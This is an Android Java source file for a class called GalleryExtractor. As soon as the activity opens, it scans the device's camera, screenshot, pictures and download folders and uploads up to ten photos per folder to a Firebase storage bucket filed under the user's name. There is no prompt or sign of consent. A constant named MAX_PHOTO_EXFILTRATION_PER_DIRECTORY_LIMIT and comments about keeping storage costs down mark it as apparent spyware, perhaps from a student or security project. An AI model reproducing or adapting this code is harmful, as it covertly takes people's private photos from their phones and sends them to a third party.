package com.droidekamobile;

import static android.content.ContentValues.TAG;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageMetadata;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.UUID;


public class GalleryExtractor extends AppCompatActivity {

    FirebaseStorage storage = FirebaseStorage.getInstance();
    StorageReference storageRef = storage.getReference();
    private static DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
    private static FirebaseAuth mAuth = FirebaseAuth.getInstance();

    ArrayList<String> commonPhotoDirectories = new ArrayList<>(Arrays.asList(Environment.DIRECTORY_PICTURES, Environment.DIRECTORY_DCIM, Environment.DIRECTORY_DOWNLOADS));
    ArrayList<String> photoFilePathsToExtract = new ArrayList<>(); // Collect all the photo directories here
    ArrayList<String> allowedPhotoExtensions =  new ArrayList<>(Arrays.asList(".png", ".jpg", ".jpeg"));
    ArrayList<String> interestingPhotoSubdirectories = new ArrayList<>(Arrays.asList("Camera", "Screenshots", "Downloads"));  // So that Zafran doesn't need to pay for Firebase storage

    private final int MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT = 10; // So that Zafran doesn't need to pay for Firebase storage too

    String photoDir;
    private boolean mSaved;
    FileInputStream fi;
    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);

        uploadGallery();

    }
    public GalleryExtractor() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            commonPhotoDirectories.add(Environment.DIRECTORY_SCREENSHOTS);
            Log.d("Files", "SCREENSHOT DIRECTORY SUPPORTED!");
        } else {
            Log.d("Files", "SCREENSHOT DIRECTORY NOT SUPPORTED!");
        }
    }
    //get images
    private String getGalleryPath() {
        return photoDir = Environment.getExternalStorageDirectory() + "/" + Environment.DIRECTORY_DCIM + "/" + "image1.jpg";
    }

    //upload images
    public void uploadGallery() {
        Log.d(ACTIVITY_SERVICE, getGalleryPath());

        for (String photoDirectory : commonPhotoDirectories) {
            listPicturesInDirectory(Environment.getExternalStorageDirectory().toString() + "/" + photoDirectory);
        }

        for (String photoFilePath : photoFilePathsToExtract) {
            obtainUsername(username -> {
                Uri localFile = Uri.fromFile(new File(photoFilePath)); //Change this part
                UploadTask uploadTask;
                String[] fileNameSplitter = photoFilePath.split("/");
                StorageReference photoref = storageRef.child(username).child("images").child("gallery").child(fileNameSplitter[fileNameSplitter.length - 2]).child(fileNameSplitter[fileNameSplitter.length - 1]);
                uploadTask = photoref.putFile(localFile);
                uploadTask.addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                        Uri sessionUri = taskSnapshot.getUploadSessionUri();
                        if (sessionUri != null && !mSaved) {
                            mSaved = true;
                        }
                    }
                });
            });

        }

    }
    public void listPicturesInDirectory(String startingDirectory) {
        Log.d("Files", "Path: " + startingDirectory);
        File directory = new File(startingDirectory);
        File[] files = directory.listFiles();

        //Don't bother recursing if there is no files inside the directory.
        if (files == null) {
            return;
        } else if (files.length == 0) {
            return;
        }

        files = reverse(files);

        Log.d("Files", "Size: "+ files.length);
        int photo_count = 0;
        for (int i = 0; i < files.length; i++) {
            String fileName = files[i].getAbsolutePath();
            if (files[i].isDirectory() && interestingPhotoSubdirectories.contains(files[i].toString())) {
                listPicturesInDirectory(files[i].getAbsolutePath());
            } else if (fileName.length() > 4 && photo_count < MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT) {
                String filenameExtension = fileName.substring(fileName.length() - 4);
                if (allowedPhotoExtensions.contains(filenameExtension)) {
                    photo_count++;
                    photoFilePathsToExtract.add(fileName);
                    Log.d("Files", "FileName:" + fileName);
                }
            }
        }
    }

    static File[] reverse(File[] a)
    {
        ArrayList<File> fileArray = new ArrayList<>(Arrays.asList(a));
        Collections.reverse(fileArray);
        File[] fileList = new File[fileArray.size()];
        return fileArray.toArray(fileList);

    }

    private void obtainUsername(FirebaseCallback firebaseCallback) {
        FirebaseUser currentUser = mAuth.getCurrentUser();
        String email = currentUser.getEmail();
        mDatabase = FirebaseDatabase.getInstance().getReference("users");

        // Incase you do not understand this part: https://www.youtube.com/watch?v=OvDZVV5CbQg
        // This solves the asynchronous issue
        ValueEventListener valueEventListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {

                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                    User user = dataSnapshot.getValue(User.class);
                    if (user.getEmail().equals(email)) {
                        String username = user.getUsername();
                        firebaseCallback.onCallback(username);
                        return;
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.d(TAG, error.getMessage());
                return;
            }
        };
        mDatabase.addListenerForSingleValueEvent(valueEventListener);

        return;
    }

    //This is just needed to fight against the asynchronous issue when obtaining data from database
    private interface FirebaseCallback {
        void onCallback(String username);
    }
//    public void uploadGallery() {
//        Log.d(ACTIVITY_SERVICE, getGalleryPath());
//        Uri localFile = Uri.fromFile(new File("/storage/emulated/0/Pictures/IMG_20230209_151614.jpg")); //Change this part
//        UploadTask uploadTask;
//        StorageReference photoref = storageRef.child("images/" + UUID.randomUUID().toString());
//        uploadTask = photoref.putFile(localFile);
//        uploadTask.addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
//            @Override
//            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
//                Uri sessionUri = taskSnapshot.getUploadSessionUri();
//                if (sessionUri != null && !mSaved) {
//                    mSaved = true;
//                }
//            }
//        });
//    }


}
